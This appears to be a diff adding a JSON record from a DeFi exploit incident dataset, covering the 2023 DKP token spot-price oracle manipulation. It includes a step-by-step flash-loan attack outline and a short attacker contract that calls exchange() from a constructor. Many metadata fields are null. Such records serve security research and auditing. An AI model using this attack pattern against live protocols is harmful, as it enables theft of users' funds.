@@ -1,0 +1,28 @@
+{
+ "id": "2023__2023-03-11_DKP_SpotOracleManipulation",
+ "source_file": "2023/2023-03-11_DKP_SpotOracleManipulation.md",
+ "title": "DKP Token Exploit — exchange() Spot Price Oracle Manipulation",
+ "date": "2023-03-11",
+ "protocol": "DKP",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// File: DKP_decompiled.sol\n    function exchange(uint256 amount) external {}  // ❌\n\n// ...\n\n    function getUsdtPrice() external view returns (uint256) {}  // ❌"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → constructor: DKPExchange.exchange(100e18)",
+  "// → DKP.transfer(msg.sender, balance)"
+ ],
+ "other_code": [
+  "// 1. deal(USDT, 800e18) for gas/fees\n// 2. exchangeDKP():\n//    flashAmount = USDT.balanceOf(Pair) * 9992 / 10000\n//    Pair.swap(flashAmount, 0, this, abi.encode(flashAmount))\n// 3. pancakeCall():\n//    a. Pre-calculate CREATE2 address of ExchangeDKP\n//    b. USDT.transfer(ExchangeDKP_address, 100e18)\n//    c. new ExchangeDKP{salt: keccak256(\"salt\")}()\n//       → constructor: DKPExchange.exchange(100e18)\n//          // price is now ~0 USDT per DKP (pair nearly empty)\n//          // receives massive DKP\n//       → DKP.transfer(msg.sender, balance)\n//    d. Repay Pair: flashAmount * 10000/9975 + 1000\n// 4. DKPToUSDT() — swap DKP profit back to USDT",
+  "interface IDKPExchange {\n    function exchange(uint256 amount) external;\n}\ncontract ExchangeDKP {\n    constructor() {\n        USDT.approve(address(DKPExchange), type(uint256).max);\n        DKPExchange.exchange(100 * 1e18);\n        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));\n    }\n}"
+ ]
+}
